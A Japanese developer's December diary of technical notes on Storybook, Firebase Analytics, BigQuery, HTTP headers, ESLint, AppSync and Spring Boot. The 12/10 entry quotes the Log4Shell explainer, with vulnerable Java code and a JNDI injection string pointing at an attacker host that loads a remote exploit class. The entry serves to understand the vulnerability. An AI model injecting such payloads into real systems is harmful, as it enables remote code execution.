# 12/1

## Storybook

昨日に引き続き、CSF 3.0 や Storybook 6.4 周りを触っていく。

@sangotaro さんと話しているなかで、いつのまにか Story title が自動生成されるようになっていたことを知る。

基本的には .stories ファイルが存在しているディレクトリ名で決定される。

`components/Hoge/index.stories.tsx` であれば、`Components/Hoge/Index` みたいなイメージ。

一定の naming rule で決定されるのは便利そうではあるが、`Index` とか付けてほしくないし、、、というのを考えるとまだ微妙かも。

## Firebase

久々に Firebase の Client 側 SDK にふれる。今回の目的は Analytics を触ってみること。結局のところ、GA の js と同じものが動いているだけっぽいんだけど、Firebase 側で Measurement されたイベントを上手く見れない。設定間違ってんのか。。。？

よくよく考えると、WACUL 退職して結構経つし、もう随分 GA 触ってなかったんだなーということに気づいた。

---

# 12/2

## reg

メンバーがアドカレに書いてくれた。普通に嬉しい。

https://qiita.com/sakamuuy/items/44a109532f06e0b619e3

reg-suit ではなく、 reg-cli を使ったパターンで、Repository に Snapshot 保持する系統なんだけど、面倒な Snapshot Update を GH Action で上手くやっているパターン

```yaml
name: Update snapshot
on:
  pull_request:
    types:
      - labeled
jobs:
  update-vrt-snapshot:
    if: contains(github.event.pull_request.labels.*.name, 'update-snapshots')
    steps:
      -  #以下略
```

## Misc

昨日の Firebase Analytics の件。1 日経った後に確認したところ、送信した event がちゃんと溜まっていた。

---

# 12/3

## reg

GH Actions のみで reg-suit っぽいことができるのか問題を久々に考える。

1. expected(= image snapshot) は Repository に直接配置
1. actual と結果の json をその repository の wiki に push
1. Report UI の SPA を別のどこかに Deploy しておく

1.は昨日の @sakamuuy の記事にあるような方法で問題ない。 2.は @gfx さんの https://gfx.hatenablog.com/entry/2021/07/04/202004 という記事を見る限り普通にできそう。

また、wiki に push した画像や JSON も https://raw.githubusercontent.com/wiki/Quramy/wiki-sandbox-testing/temp/hoge/result.json のような URL で DL できるし、何なら CORS でアクセスできる。

ということはだ、3.の URL を仮に `https://diff-report.reg-viz.net` としておいて、そこに 2.で deploy した json の URL を食わせるとする。

`https://diff-report.reg-viz.net/?result_url=https%3A%2F%2Fraw.githubusercontent.com%2Fwiki%2FQuramy%2Fwiki-sandbox-testing%2Ftemp%2Fhoge%2Fresult.json`

最初に JSON を fetch してくれば、後はいつもの Report UI と一緒にできるかも。

---

# 12/5

## Misc

ひぃひぃ言いながらアドカレ 2 本書ききる。疲れた。。。

---

# 12/6

## PicoML

アドカレについて、@blackenedgold さんとかに捕捉されてたのは地味に嬉しい...!

https://twitter.com/blackenedgold/status/1467736749766225920

---

# 12/7

## HTTP

HTTP のレスポンスヘッダの `Content-Disposition` というものの存在を知る。

https://developer.mozilla.org/ja/docs/Web/HTTP/Headers/Content-Disposition

UA に直接ファイルを開かせるのか、それとも保存させるのかを指定できる。 RFC の番号的に結構古いっぽい。。。？

https://datatracker.ietf.org/doc/html/rfc2183

似たような用途で利用されそうなのが、a タグの `download` 属性。

```html
<a href="doc.pdf" download="doc.pdf" />
```

https://developer.mozilla.org/ja/docs/Web/HTML/Element/a#attr-download

ただ、こちらは Same Origin でないと無視される。

「インラインで開くようにしたい」「ダウンロードされるようにしたい」っていうの、割とよく言われるんだけど、どれがいいんだろうな。。。

---

# 12/8

## 読書

先日推薦された Team Topologies の物理本が手元に届いたので読み始める。

一章を読み終えたところだが、「組織設計を見直せ(= 静的に確定するものと思うな)」「チームの認知負荷にバジェットがあると考えろ」という説が個人的に目新しさを覚えた。一方、「アーキテクチャを見据えて組織を考えろ(= 逆コンウェイ則)」などは他でも見聞きしたことのある部分。

---

# 12/9

## react-query

React Query v4 の初版が出ている模様。

https://github.com/tannerlinsley/react-query/releases/tag/v4.0.0-alpha.1

---

# 12/10

## HTTP

キャッシュ制御系の話。

```
Cache-Control: state-while-revalidate
```

「CDN にだけ有効となるようにキャッシュコントロールしたい」というケースに対応できない。

```
Cache-Control: no-store
CDN-Cache-Control: state-while-revalidate
```

のようにすれば「端末にはキャッシュ保持しないが、CDN にキャッシュ効かせておく」のようなことができる。

- https://datatracker.ietf.org/doc/html/draft-cdn-control-header-01#section-2
- https://asnokaze.hatenablog.com/entry/2020/11/25/000542

## Java

log4j の脆弱性の件。

https://www.lunasec.io/docs/blog/log4j-zero-day/

```java
import org.apache.log4j.Logger;

import java.io.*;
import java.sql.SQLException;
import java.util.*;

public class VulnerableLog4jExampleHandler implements HttpHandler {

  static Logger log = Logger.getLogger(log4jExample.class.getName());

  /**
   * A simple HTTP endpoint that reads the request's User Agent and logs it back.
   * This is basically pseudo-code to explain the vulnerability, and not a full example.
   * @param he HTTP Request Object
   */
  public void handle(HttpExchange he) throws IOException {
    string userAgent = he.getRequestHeader("user-agent");

    // This line triggers the RCE by logging the attacker-controlled HTTP User Agent header.
    // The attacker can set their User-Agent header to: ${jndi:ldap://attacker.com/a}
    log.info("Request User Agent:" + userAgent);

    String response = "<h1>Hello There, " + userAgent + "!</h1>";
    he.sendResponseHeaders(200, response.length());
    OutputStream os = he.getResponseBody();
    os.write(response.getBytes());
    os.close();
  }
}
```

`"${jndi:ldap://attacker.com/a}"` をロギングしようとすると、 JNDI を反応させられるので、さらにそこから `http://second-stage.attacker.com/Exploit.class` のような Remote Java Class 呼び出しをさせることができてしまう。

JNDI の LDAP が勝手に外部呼び出しを行うかどうかは、JDK の version 次第とのこと。`com.sun.jndi.ldap.object.trustURLCodebase` が セットされている必要がある。

## ESLint

https://github.com/yannickcr/eslint-plugin-react/blob/master/docs/rules/destructuring-assignment.md

このルールにしておいたほうが、terser で圧縮かますときに少しだけ有利かも？と思った。

---

# 12/13

## Misc

久々に 1 から nginx の設定書こうと思ったら、以外と書けないもんだな。。。

---

# 12/14

## ESLint

Storybook の CSF3.0 を強制するルールを思いついた。

```ts
import type { Rule } from "eslint";
import type { VariableDeclarator } from "estree";

const STORY_DECLARATOR_SELECTOR =
  "ExportNamedDeclaration > VariableDeclaration[kind='const'] > VariableDeclarator";

export const preferObjectLiteralCsf: Rule.RuleModule = {
  meta: {
    type: "problem",
    docs: {
      description: "Prefer object literal style Component Story Format"
    }
  },
  create: context => {
    return {
      [STORY_DECLARATOR_SELECTOR](node: VariableDeclarator) {
        if (!node?.init || node?.init?.type === "ObjectExpression") return;
        context.report({
          node: node.init,
          message: "Story must be exported as an Object Literal."
        });
      }
    };
  }
};
```

要するに「RHS が Object Literal かどうか」で雑に見分けちゃうパターン。偽陽性ありそうではあるが、一定使えそうな気がする。

---

# 12/15

## AWS

去年に続き、社内で開催された AWS GameDay に参加。

AppSync を少し眺めたりするなどした。

以前にも DynamoDB を Data Source にして、適当な Schema を設定して GraphQL API を作る、というのはほんのさわりだけやったことがあるが、やはりしち面倒臭い。

たとえば、以下のような SDL に対して、

```graphql
type Hoge {
  id: ID!
  name: String!
}

type Query {
  hoge(id: ID!): Hoge
}
```

VTL でマッピングを書くことはできる。

```yaml
version: 2017-02-28
operation: GetItem
key:
  id: $util.dynamodb.toDynamoDBJson($ctx.args.id)
```

ただ、 `$util` だの `$ctx` だのをいちいち覚えてられないし、柔軟性で考えても、普通に Resolver を適当な言語で書いた方が楽だ。

```ts
const Resolver = {
  Query: {
    hoge(root, { id }) {
      return docmentClient
        .get({
          TableName: "Hoge",
          Key: {
            id
          }
        })
        .promise();
    }
  }
};
```

API Gateway を自分の手で書くのが面倒なので、Serverless Framework に頼ったのと似ているかも。

## Misc

副業でやっているおしごとについて、 @cos31 さんのアドカレでちょこっと言及してもらっていた。

https://cos31.hatenablog.jp/entry/bellface_idp_arch

---

# 12/17

## Spring Boot

久々に手元で立ち上げる。前も無理やり調べようと思って挫折したのだけど、Tomcat の起動ポート変える方法として、

```yaml
# application.yml

server:
  port: 8082
```

はすぐにたどり着くし、直接 java ぶっ叩くのであれば、やはり同じように渡せる。

```sh
java -jar spring-5.jar --server.port=8083
```

これと同じことを Gradle CLI の起動コマンドからやる方法ってないのかしら、と思ったけど、普通に渡せばよいだけ？

```sh
./gradlew -Dserver.port=8083 bootRun
```

https://spring.pleiades.io/spring-boot/docs/current/gradle-plugin/reference/htmlsingle/#running-your-application

---

# 12/20

## Puppeteer

同僚がアドカレに出していた記事にて。

https://qiita.com/Kontam/items/7555f1ff3dd758d4e96a

「CSR での画面遷移速度を知る」っていうテーマだけど、Storycap で苦しんだ問題と割と似ているものがある。Performance Timeline のキャプチャ差分比較するのはなるほど感あるな。

「切り捨てた要件」に

> 早い計測速度

とあるから、そこそこ時間はかかってそうなので、Storycap みたいな CI で何回も何百枚も取らなきゃいけないようなケースには不向きだろうけど。

## WebRTC

他の人と WebRTC 文脈の会話をしている中で TURN や STUN といったタームを知らなかったので :memo:

https://ja.wikipedia.org/wiki/TURN の以下引用部分が概要。

> STUN (Session Traversal Utilities for NAT) は、アプリケーションが NAT を越えるための 1 つの方法を提供する。STUN はクライアントがピアからのパケットを受信するために利用するトランスポートアドレス（IP アドレスとポート）を入手することを可能にする。しかしながら、STUN によって入手されたアドレスはすべてのピアに対して利用可能ではないかもしれない。それらのアドレスは、ネットワークのトポロジー的状況に依存して機能する。そのため、STUN はそれ自身では NAT 超えについて完全な解決を提供することはできない。
>
> 完全な解決には、インターネットにパケットを送信することができるあらゆるピアから、クライアントがメディアを受けることができるトランスポートアドレスを入手できることが必要である。これは、インターネット上に存在するサーバを通過したデータに頼ることによってのみ達成することができる。この仕様は TURN、つまり上記のようなサーバを通過したデータからの IP アドレスやポートをクライアントが獲得することを可能にする通信規格を記述している。

STUN にせよ、TURN にせよ、ピア同士が NAT を超えて直接通信を行うために必要となる基盤的な仕組み、ということのようだ。

[O'Reilly のハイパフォーマンス ブラウザネットワーキング](https://www.oreilly.co.jp/books/9784873116761) に詳細が載っているようなんだけど、刊行が 2014 年で結構古いので、購入は悩むところ。

---

# 12/21

## CSS

今だに Flex の Direction 方向のサイジングロジックがわからなくなるときがある。そういうときに見返すと良さそうな Blog.

https://mastery.games/post/the-difference-between-width-and-flex-basis/

---

# 12/22

## TypeScript

前々から少し考えてはいたんだけど、talt と ts-query で簡単なコード編集系の tool を作れないだろうか。

直接のモチベーションは Storybook の CSF3 について。

CSF2 系だと以下のようになっているはずで、

```tsx
import { Story, Meta, Template } from "@storybook/react";
import { action } from "@storybook/addon-actions";
import { Awesome, AwesomeComponentProps } from ".";

const meta: Meta = {
  title: "components/Awesome",
  component: Awesome
};

export default meta;

const Template: Story<AwesomeComponentProps> = args => <Awesome {...args} />;

export const Normal = Template.bind({});

Normal.args = {
  hoge: "HOGE",
  onClick: action("onClick")
};
```

これは CSF3 系にすると次のようになる。

```tsx
import type { ComponentStoryObj, Meta } from "@storybook/react";
import { action } from "@storybook/addon-actions";
import { Awesome } from ".";

const meta: Meta = {
  title: "components/Awesome",
  component: Awesome
};

export default meta;

export const Normal: ComponentStoryObj<typeof Awesome> = {
  args: {
    hoge: "HOGE",
    onClick: action("onClick")
  }
};
```

Storybook 公式の migration CLI である程度の変換ができるのだけど、おそらく全体の AST を構成してから `@babel/generate` をかけているような挙動のようで、whitespace が潰れてしまったりする。また、TypeScript の型周りについてのサポートも大分怪しい気配。

それであれば、Migration 用の script を自分で書けばいいじゃない、となる。

better-name のときと同じ様なアプローチを取ればいいはずだし。

## Firebase Analytics

Firebase GA で以下のようなロギングを行ったとして、

```ts
import { getAnalytics, logEvent } from "firebase/analytics";

const analytics = getAnalytics();
logEvent(analytics, "select_content", {
  content_type: "image",
  content_id: "P12453"
});
```

`content_type` や `content_id` は BigQuery 上では `event_params` という RECORD 型の項目として連携されることになる。

「イベント名が `select_content` で且つ `content_id` が `P12453` 」というイベントだけを検索するにはどうすればいいんだろう？となっていたのだけど、[Firebase Analytics を BigQuery で分析したいときに役立つテクニック](https://developer.hatenastaff.com/entry/2021/09/16/093000) という blog が役に立った。

基本的には下記の形の Sub Query を覚えておけば大概はことが足りそう。

```sql
SELECT
  event_name,
  event_params,
  (SELECT value.string_value FROM UNNEST(event_params) WHERE key = "content_id") AS content_id
FROM
  `[project].analytics_[id].events_[date]`;
```

`UNNEST` 関数がポイントになるが、そもそも GA のカスタムイベントパラメータがどういう構造になってるの？を知っておく必要がある。

BigQuery のテーブルとして見た場合の構造は次のようになっているイメージ。

```ts
type Event = {
  eventName: string;
  eventParams: {
    key: string;
    value: { stringValue: string; intValue: number };
  }[];
  eventTimestamp: number;
};
```

`event_params` は配列、ARRAY 型になっている。 `UNNEST` は、この階層構造を崩して、第一正規形にするようなイメージ。

```sql
SELECT * FROM UNNEST(["HOGE", "FOO"]) AS element WITH OFFSET as offset;
```

は 2 行の結果を返すことになる。 https://cloud.google.com/bigquery/docs/reference/standard-sql/arrays#flattening_arrays

なので、イベントパラメータからパラメータ名である `key` で絞り込んだ値を副問合せで作っておけばよい、ということになる。

さらに `WITH` を使えば、WHERE 句の条件としても使える。なるほどなー。

```sql
WITH results as (
  SELECT
    event_name,
    event_params,
    (SELECT value.string_value FROM UNNEST(event_params) WHERE key = "content_id") AS content_id
  FROM
    `[project].analytics_[id].events_[date]`;
)
SELECT * FROM results
WHERE
  event_name = "select_content"
  AND content_id = "P12453"
;
```

---

# 12/23

## GraphQL

Apollo Client が v4 で大きく変更されるみたい。

https://github.com/apollographql/apollo-client/issues/8245

> This issue tracks the rewrite of Apollo Client's React integration layer, covering many areas such as:
>
> - Ensuring better communication with the AC core (by making the React layer lighter weight)
> - Removing graphql HOC and render prop approaches
> - Supporting suspense + data fetching
> - Reconsidering our supported hooks (add useFragment, consider removing useLazyQuery, etc.)
> - Existing hook API changes (better async-ness, reduce/eliminate onError / onCompleted callback use, etc.)
> - Remove partialRefetch

Suspense for Data fetching や `useFragment` の対応が入るとのこと。

というか、これ去年の今頃に俺がコメントで書いたヤツなのに、何のリアクションも無かったのは悲しい気持ち。。。

https://github.com/apollographql/apollo-feature-requests/issues/162#issuecomment-750326698
